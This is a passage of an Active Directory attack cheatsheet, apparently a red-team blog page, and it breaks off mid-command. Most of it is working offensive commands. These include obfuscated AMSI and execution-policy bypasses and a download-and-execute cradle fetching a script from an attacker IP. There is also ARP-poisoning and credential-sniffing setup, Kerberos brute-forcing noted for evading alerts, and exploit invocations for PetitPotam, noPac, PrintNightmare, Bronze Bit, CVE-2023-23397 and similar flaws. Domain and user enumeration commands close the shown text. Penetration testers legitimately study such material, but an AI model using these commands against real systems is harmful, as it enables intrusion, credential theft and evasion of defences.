description = "This cheatsheet is built from numerous papers, GitHub repos and GitBook, blogs, HTB boxes and labs,..."
full_description = '''Active Directory This cheatsheet is built from numerous papers, GitHub repos and GitBook, blogs, HTB boxes and labs, and other resources found on the web or through my experience. This was originally a private page that I made public, so it is possible that I have copy/paste some parts from other places and I forgot to credit or modify. If it the case, you can contact me on my Twitter @BlWasp_. I will try to put as many links as possible at the end of the page to direct to more complete resources. Misc Internal audit mindmap Insane mindmap by @M4yFly. Bypass AMSI #Downgrade PowerShell powershell -v 2 -c "<...>" #Classic sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} ) #Base64 [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true) #Force AMSI error $w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils' $assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m)) $field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static') $field.SetValue($null,$true) #On PowerShell 6 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('s_amsiInitFailed','NonPublic,Static').SetValue($null,$true) Create PowerShell credentials $pass = ConvertTo-SecureString "Password123!" -AsPlainText -Force $cred = New-Object System.Management.Automation.PSCredential("DOMAIN\user", $pass) Decipher Secure-String With the corresponding AES key $aesKey = (49, 222, 253, 86, 26, 137, 92, 43, 29, 200, 17, 203, 88, 97, 39, 38, 60, 119, 46, 44, 219, 179, 13, 194, 191, 199, 78, 10, 4, 40, 87, 159) $secureObject = ConvertTo-SecureString -String "76492d11167[SNIP]MwA4AGEAYwA1AGMAZgA=" -Key $aesKey $decrypted = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureObject) $decrypted = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($decrypted) $decrypted Bypass execution policy #By spawning a new PowerShell session in the current one powershell -nop -exec bypass #By disabling the execution policy in the registry Set-ExecutionPolicy -ExecutionPolicy bypass -Scope LocalMachine -Force #Load a PowerShell module without confirmation prompt Import-Module ./evil.psm1 -Force Execution context / AppLocker AppLocker #Get AppLocker policy Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections By default, C:\Windows is not blocked, and C:\Windows\Tasks is writeable by any users. Bypass Constrained Language Mode Import BypassCLM.exe and Mono.Options.dll in a directory where the AppLocker policy authorize the execution, then #Get language mode $ExecutionContext.SessionState.LanguageMode #To bypass with PowerShell 6 pwsh .\BypassCLM.exe -c "iex (new-object net.webclient).downloadstring('http://192.168.50.44/Invoke-HelloWorld.ps1')" Port forwarding We can contact a machine, and this one can contact another machine, but we can't contact the second machine directly from our primary machine On the "central" machine, all the hit on the port 80 or 4545 will be forward to the connectaddress on the specified port : #Forward the port 4545 for the reverse shell, and the 80 for the http server for example netsh interface portproxy add v4tov4 listenport=4545 connectaddress=192.168.50.44 connectport=4545 netsh interface portproxy add v4tov4 listenport=80 connectaddress=192.168.50.44 connectport=80 #Correctly open the port on the machine netsh advfirewall firewall add rule name="PortForwarding 80" dir=in action=allow protocol=TCP localport=80 netsh advfirewall firewall add rule name="PortForwarding 80" dir=out action=allow protocol=TCP localport=80 netsh advfirewall firewall add rule name="PortForwarding 4545" dir=in action=allow protocol=TCP localport=4545 netsh advfirewall firewall add rule name="PortForwarding 4545" dir=out action=allow protocol=TCP localport=4545 Run domain commands from a non domain joined computer runas /netonly /user:DOMAIN\User1 cmd.exe Initial Access What to do when you are plugged on the network without creds. NTLM authentication capture on the wire with Responder or Inveigh poisoning, maybe in NTLMv1 ? Relay the NTLM authentications to interesting endpoints, be careful to the signing SMB socks to list/read/write the shares LDAP to dump the directory LDAPS (or maybe SMB if signing not required) to add a computer account ... ARP poisoning with bettercap, can be used to poison ARP tables of targets and receive authenticated requests normally destinated to other devices. Interesting scenarios can be found here. By sniffing everything on the wire with Wireshark, some secrets can be found with PCredz. First, run bettercap with this config file: # quick recon of the network net.probe on # set the ARP poisoning set arp.spoof.targets <target_IP> set arp.spoof.internal true set arp.spoof.fullduplex true # control logging and verbosity events.ignore endpoint events.ignore net.sniff.mdns # start the modules arp.spoof on net.sniff on sudo ./bettercap --iface <interface> --caplet spoof.cap Then sniff with Wireshark. When it is finish, save the trace in a .pcap file and extract the secrets: python3 ./Pcredz -f extract.pcap Poison the DHCPv6 answer to receive NTLM or Kerberos authentication NTLM auths can be relayed with ntlmrelayx Kerberos auths can be relayed with krbrelayx to HTTP endpoints (ADCS, SCCM AdminService API) Search for a domain account Look for SMB Guest and null session, and LDAP null bind Perform RID cycling (look at the Active Directory - Python edition cheatsheet) With SMB login bruteforce With Kerbrute bruteforce Allows you to bruteforce Kerberos on user accounts while indicating whether the user account exists or not. Another advantage over smb_login is that it doesn't correspond to the same EventId, thus bypassing potential alerts. The script can work with 2 independent lists for users and passwords, but be careful not to block accounts! ./kerbrute userenum -domain domain.local users.txt Test for the Top1000 with login = password Possible other passwords: (empty) password P@ssw0rd Look for juicy CVEs Search for devices like printers, routers, or similar stuff with default creds In case a printer (or something similar) has an LDAP account, but use the SASL authentication family instead of SIMPLE, the classic LDAP passback exploitation with a nc server will not be sufficient to retrieve the credentials in clear text. Instead, use a custom LDAP server that only offer the weak PLAIN and LOGIN protocols. This Docker permits to operate with weak protocols. docker buildx build -t ldap-passback . docker run --rm -ti -p 389:389 ldap-passback In parallel, listen with tshark: tshark -i any -f "port 389" \ -Y "ldap.protocolOp == 0 && ldap.simple" \ -e ldap.name -e ldap.simple -Tjson CVEs AD oriented SPNEGO RCE (CVE-2022-37958) - No public POC for the moment PetitPotam pre-auth (CVE-2022-26925) If the target is not patched, this CVE can be exploited without creds. ./PetitPotam.exe -pipe all <attacker_IP> <target_IP> NoPac (a.k.a. SamAccountName Spoofing, CVE-2021-42278 and CVE-2021-42287) To exploit these vulnerabilities you need to already control a computer account or have the right to create a new one. #Scan for the vuln .\noPac.exe scan -domain domain.local -user user1 -pass 'password' #Exploit it and retrieve a ST for the DC .\noPac.exe -domain domain.local -user user1 -pass 'password' /dc dcVuln.domain.local /mAccount evilComputer /mPassword 'evilPass!' /service cifs /ptt PrintNightmare (CVE-2021-1675 / CVE-2021-34527) #Load and execute a DLL hosted on a SMB server on the attacker machine ./SharpPrintNightmare.exe '\\<attacker_IP>\smb\addUser.dll' '\\<target_IP>' Zerologon (CVE-2020-1472) The relay technique is preferable to the other one which is more risky and potentially destructive. See in the link. EternalBlue / Blue Keep (MS17-010 / CVE-2019-0708) The exploits in the Metasploit framework are good for these two CVEs. #EternalBlue msf6 exploit(windows/smb/ms17_010_psexec) > #Blue Keep msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > SMBGhost (CVE-2020-0796) Be careful, this exploit is pretty unstable and the risk of BSOD is really important. The exploit in the Metasploit framework is good for this CVE. msf6 exploit(windows/smb/cve_2020_0796_smbghost) > RC4-MD4 downgrade (CVE-2022-33679) To exploit this CVE the RC4-MD4 encryption must be enabled on the KDC, and an AS-REP Roastable account is needed to obtain an ST for the target. ./CVE-2022-33079.py -dc-ip <DC_IP> domain.local/<as-rep_roastable_user> <target_NETBIOS> Credentials Roaming (CVE-2022-30170) # Fetch current user object $user = get-aduser <victim username> -properties @('msPKIDPAPIMasterKeys','msPKIAccountCredentials', 'msPKI-CredentialRoamingTokens','msPKIRoamingTimestamp') # Install malicious Roaming Token (spawns calc.exe) $malicious_hex = "" $attribute_string = "B:$($malicious_hex.Length):${malicious_hex}:$($user.DistinguishedName)" Set-ADUser -Identity $user -Add @{msPKIAccountCredentials=$attribute_string} -Verbose # Set new msPKIRoamingTimestamp so the victim machine knows an update was pushed $new_msPKIRoamingTimestamp = ($user.msPKIRoamingTimestamp[8..15] + [System.BitConverter]::GetBytes([datetime]::UtcNow.ToFileTime())) -as [byte[]] Set-ADUser -Identity $user -Replace @{msPKIRoamingTimestamp=$new_msPKIRoamingTimestamp} -Verbose Bronze Bit (CVE-2020-17049) To exploit this CVE, a controlled service account with constrained delegation to the target account is needed. ./Rubeus.exe s4u /bronzebit /user:<service_account> /rc4:<service_account_hash> /dc:dc.domain.local /impersonateuser:Administrator /domain:domain.local /altservice:cifs/target.domain.local /nowrap MS14-068 goldenPac.py 'domain.local'/'user1':'password'@<DC_IP> Targeting Exchange server ProxyNotShell / ProxyShell / ProxyLogon (CVE-2022-41040 & CVE-2022-41082 / CVE-2021-34473 & CVE-2021-34523 & CVE-2021-31207 / CVE-2021-26855 & CVE-2021-27065) The exploits in the Metasploit framework are good for these three CVEs. msf6 exploit(windows/http/exchange_proxynotshell_rce) > msf6 exploit(windows/http/exchange_proxyshell_rce) > msf6 exploit(windows/http/exchange_proxylogon_rce) > CVE-2023-23397 This CVE permits to leak the NTLM hash of the target as soon as the email arrives in his Outlook mail box. This PoC generates a .msg file containing the exploit in the pop-up sound attribute. It is up to you to send the email to the target. python3.exe CVE-2023-23397.py --path '\\<attacker_IP>\' Before sending the email, run Inveigh to intercept the NTLM hash. For local privesc CVE-2022-41057 KrbRelayUp SpoolFool (CVE-2022-21999) ./SpoolFool.exe -dll adUser.dll #In PowerShell Import-Module .\SpoolFool.ps1 Invoke-SpoolFool -dll adUser.dll PrintNightmare (CVE-2021-1675 / CVE-2021-34527) ./SharpPrintNightmare.exe ./adUser.dll HiveNightmare (CVE-2021-36934) ./Invoke-HiveNightmare.ps1 -path ./HiveDumps Domain Enumeration Domain objects Current domain #PowerView Get-NetDomain #AD Module Get-ADDomain #Domain SID Get-DomainSID (Get-ADDomain).DomainSID #Domain policy (Get-DomainPolicy)."system access" Another domain #PowerView Get-NetDomain -Domain domain.local #AD Module Get-ADDomain -Identity domain.local Domain controller Current domain #PowerView Get-NetDomainController #AD Module Get-ADDomainController Get-NetDomainController -Domain domain.local Get-ADDomainController -DomainName domain.local -Discover Users enumeration List users #PowerView Get-NetUser Get-NetUser -Identity user1 #AD Module Get-ADUser -Filter * -Properties * Get-ADUser -Identity user1 -Properties * User's properties #AD Module Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}} Search for a particular string in attributes Find-UserField -SearchField Description -SearchTerm "password" Get-ADUser -Filter 'Description -like "*password*"' -Properties Description | select name,Description Actively logged users on a machine Needs local admin rights on the target Get-NetLoggedon -ComputerName <target> Locally logged users on a machine Needs remote registry on the target - started by-default on server OS Get-LoggedonLocal -ComputerName <target> Last logged user on a machine Needs administrative rights and remote registry on the target Get-LastLoggedOn -ComputerName <target> User hunting Find machine where the user has admin privs Find-LocalAdminAccess -Verbose If the RPC or SMB ports are blocked, see Find-WMILocalAdminAccess.ps1 and Find-PSRemotingLocalAdminAccess.ps1 to use WMI or PowerShell Remoting Find local admins on the domain machines Invoke-EnumerateLocalAdmin -Verbose Find machines where specific users or groups have sessions Invoke-UserHunter #Admins Invoke-UserHunter -GroupName "<group_target>" Check local admin access for the current user where the targets are found Invoke-UserHunter -CheckAccess Computers enumeration #PowerView Get-NetComputer Get-NetComputer -OperatingSystem "*Server 2016*" Get-NetComputer -FullData #AD Module Get-ADComputer -Filter * | select Name Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select Name,OperatingSystem Get-ADComputer -Filter * -Properties DNSHostName | %{TestConnection -Count 1 -ComputerName $_.DNSHostName} Get-ADComputer -Filter * -Properties * Groups enumeration Groups in the current domain #PowerView Get-NetGroup Get-NetGroup -FullData #AD Module Get-ADGroup -Filter